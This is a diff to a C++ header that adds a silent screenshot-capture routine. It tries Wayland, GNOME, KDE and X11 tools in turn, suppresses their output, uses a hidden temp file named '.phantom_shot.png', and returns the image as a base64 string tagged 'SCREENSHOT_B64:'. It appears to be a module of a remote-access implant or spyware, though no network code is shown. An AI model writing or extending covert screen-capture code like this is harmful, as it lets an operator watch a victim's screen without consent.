@@ -84,13 +84,71 @@ inline std::string capture() {
 
 namespace screenshot {
 
-inline std::string capture() {
-    // Try X11 first (requires -lX11 at link time)
-    // If X11 is not available, fall back to import or screencap
+// Capture a command's stdout as PNG bytes. True only on a CLEAN exit with
+// data: a tool that failed (no Wayland socket, no DISPLAY) must not be
+// reported as a screenshot.
+inline bool capture_stdout_png(const std::string& cmd,
+                               std::vector<unsigned char>& out) {
+    out.clear();
+    FILE* f = popen(cmd.c_str(), "re");
+    if (!f) return false;
+    char buf[4096];
+    int n;
+    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
+        out.insert(out.end(), buf, buf + n);
+    }
+    return pclose(f) == 0 && !out.empty();
+}
 
-    // Try using ImageMagick's "import" command
-    // or scrot, or xwd
-    // Most reliable: use popen to run a command
+// Run a tool that writes PNG to a file, then read (and remove) it.
+inline bool capture_file_png(const std::string& cmd, const char* path,
+                             std::vector<unsigned char>& out) {
+    out.clear();
+    std::remove(path);
+    if (system(cmd.c_str()) != 0) { std::remove(path); return false; }
+    FILE* f = fopen(path, "rb");
+    if (f) {
+        fseek(f, 0, SEEK_END);
+        long sz = ftell(f);
+        fseek(f, 0, SEEK_SET);
+        if (sz > 0) {
+            out.resize(static_cast<size_t>(sz));
+            size_t got = fread(out.data(), 1, static_cast<size_t>(sz), f);
+            out.resize(got);
+        }
+        fclose(f);
+    }
+    std::remove(path);
+    return !out.empty();
+}
+
+inline std::string capture() {
+    // Ordered by how WIDELY the tool is present, not by protocol: Wayland is
+    // now the default session on Fedora/Ubuntu, where the old X11 grabbers
+    // (`import -window root`, `xwd`) return an EMPTY frame — so the Wayland
+    // tools are tried first, then X11, then Android's `screencap`.
+    std::vector<unsigned char> png;
+    const char* tmp = "/tmp/.phantom_shot.png";
+
+    // Wayland: grim pipes the PNG straight to stdout (needs a Wayland session)
+    if (capture_stdout_png("grim - 2>/dev/null", png)) {
+        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
+    }
+    // GNOME (Wayland or X11)
+    if (capture_file_png(std::string("gnome-screenshot -f ") + tmp +
+                         " >/dev/null 2>&1", tmp, png)) {
+        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
+    }
+    // KDE Spectacle
+    if (capture_file_png(std::string("spectacle -b -n -o ") + tmp +
+                         " >/dev/null 2>&1", tmp, png)) {
+        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
+    }
+    // X11: scrot
+    if (capture_file_png(std::string("scrot -z ") + tmp +
+                         " >/dev/null 2>&1", tmp, png)) {
+        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
+    }
 
     // Method 1: import (ImageMagick)
     std::string cmd = "import -window root -quality 85 PNG:- 2>/dev/null";
